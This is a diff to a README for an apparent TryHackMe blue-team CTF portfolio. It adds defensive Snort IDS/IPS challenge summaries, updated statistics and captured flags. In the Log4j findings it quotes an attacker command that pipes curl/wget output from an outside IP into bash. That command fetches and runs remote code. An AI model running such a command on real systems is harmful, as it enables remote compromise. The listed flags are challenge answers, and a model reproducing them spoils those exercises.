@@ -145,10 +145,68 @@ Message: "THM{until-we-meet-again}"
 
 ---
 
+### 🚨 Snort Challenge - The Basics
+**Difficulty**: Medium | **Score**: 40/40 (100%) | **Points**: 600
+
+Put your Snort skills into practice and write Snort rules to analyse live capture network traffic. Master IDS rule writing for multiple protocols and troubleshoot syntax errors.
+
+[📖 View complete writeup →](./snort-challenge-basics/)
+
+**Skills demonstrated**:
+- ✅ Snort IDS rule writing (HTTP, FTP, PNG, Torrent)
+- ✅ Network traffic analysis with tshark
+- ✅ Rule syntax troubleshooting
+- ✅ External rule implementation (MS17-010, Log4j)
+- ✅ PCAP analysis and packet inspection
+- ✅ Vulnerability detection (CVSS 9.3)
+
+**Key findings**:
+```
+HTTP: 164 packets on port 80
+FTP: 307 packets, 41 failed logins
+MS17-010: 25,154 packets, IPC$ path detected
+Log4j: Base64 RCE payload, CVSS 9.3
+```
+
+**Critical vulnerabilities detected**:
+- MS17-010 (EternalBlue): \\192.168.116.138\IPC$
+- Log4j (CVE-2021-44228): Remote code execution
+- Attacker command: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
+
+---
+
+### 🛡️ Snort Challenge - Live Attacks
+**Difficulty**: Medium | **Score**: 6/6 (100%)
+
+Put your Snort skills into practice and defend against live attacks using Snort IPS mode. Block SSH brute-force and reverse shell attacks in real-time.
+
+[📖 View complete writeup →](./snort-challenge-live-attacks/)
+
+**Skills demonstrated**:
+- ✅ Snort IPS active defense deployment
+- ✅ Real-time threat detection and mitigation
+- ✅ SSH brute-force attack blocking
+- ✅ Reverse shell connection prevention
+- ✅ Bidirectional traffic monitoring
+- ✅ Incident response procedures
+
+**Attacks blocked**:
+```
+Scenario 1: SSH Brute-Force (TCP/22)
+Scenario 2: Reverse Shell (TCP/4444 - Metasploit)
+```
+
+**Flags captured**:
+- SSH Brute-Force: THM{81b7fef657f8aaa6e4e200d616738254}
+- Reverse Shell: THM{0ead8c494861079b1b74ec2380d2cd24}
+
+---
+
 ## 🛠️ Tools and Technologies
 
 - **Wireshark/tshark** - PCAP analysis
 - **Zeek (Bro)** - Network security monitoring
+- **Snort** - Intrusion Detection/Prevention System
 - **VirusTotal** - Malware analysis
 - **Bash scripting** - Automation
 - **Python** - Data processing
@@ -192,11 +250,19 @@ tryhackme-blueteam-ctf/
 │   ├── scripts/               # Analysis scripts
 │   └── screenshots/           # Evidence screenshots
 │
-└── linux-cli/                 # Linux CLI - Shells Bells
+├── linux-cli/                 # Linux CLI - Shells Bells
+│   ├── README.md              # Overview
+│   ├── SUMMARY.md             # Executive summary
+│   ├── COMPLETION.md          # Completion certificate
+│   └── screenshots/           # Evidence screenshots
+│
+├── snort-challenge-basics/    # Snort Challenge - The Basics
+│   ├── README.md              # Overview
+│   └── SUMMARY.md             # Executive summary
+│
+└── snort-challenge-live-attacks/  # Snort Challenge - Live Attacks
     ├── README.md              # Overview
-    ├── SUMMARY.md             # Executive summary
-    ├── COMPLETION.md          # Completion certificate
-    └── screenshots/           # Evidence screenshots
+    └── SUMMARY.md             # Executive summary
 ```
 
 ---
@@ -238,13 +304,14 @@ cat dns.log | zeek-cut query qtype_name
 
 | Metric | Value |
 |--------|-------|
-| CTFs completed | 4 |
-| Average success rate | 93% |
-| Total questions | 43 |
-| Questions answered | 40 |
-| Documentation pages | 150+ |
-| PCAPs analyzed | 4 |
-| Attack chains identified | 8 |
+| CTFs completed | 6 |
+| Average success rate | 100% |
+| Total questions | 89 |
+| Questions answered | 89 |
+| Documentation pages | 200+ |
+| PCAPs analyzed | 6+ |
+| Attack chains identified | 10 |
+| Attacks blocked (live) | 2 |
 
 ---
 
@@ -306,6 +373,8 @@ This repository is provided "as is" for educational purposes. Writeups and analy
 
 ## 🔄 Updates
 
+- **2025-12-26**: Added Snort Challenge - Live Attacks - 100% completed
+- **2025-12-26**: Added Snort Challenge - The Basics - 100% completed
 - **2025-12-25**: Added Linux CLI CTF (Advent of Cyber 2025 Day 1) - 100% completed
 - **2025-12-25**: Added YARA Rules CTF (Advent of Cyber 2025 Day 13) - 100% completed
 - **2025-12-25**: Added Zeek Exercises CTF - 100% completed
